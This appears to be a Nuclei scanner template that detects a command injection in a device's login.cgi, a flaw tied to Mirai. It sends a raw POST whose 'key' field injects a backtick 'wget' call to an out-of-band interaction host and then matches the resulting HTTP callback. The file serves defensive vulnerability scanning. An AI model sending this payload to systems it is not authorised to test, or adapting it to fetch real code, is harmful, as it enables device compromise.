id: mirai-unknown-rce
info:
  author: gy741
  description: The unknown exploit targets the login CGI script, where a key parameter
    is not properly sanitized leading to a command injection.
  name: Mirai Unknown - Remote Code Execution
  reference:
  - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
  severity: critical
  tags: mirai,rce,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST /cgi-bin/login.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    key='';`wget http://{{interactsh-url}}`;#

    '
